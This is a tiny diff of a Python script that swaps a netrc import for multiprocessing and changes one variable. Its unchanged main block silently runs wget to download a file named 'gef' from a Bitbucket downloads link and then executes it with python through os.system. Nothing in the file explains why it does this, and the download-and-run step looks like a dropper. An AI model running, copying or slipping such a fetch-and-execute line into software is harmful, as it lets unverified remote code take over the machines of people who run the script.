@@ -1,4 +1,4 @@
-import sys,os,netrc
-p=12
+import sys,os,multiprocessing
+u=18
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
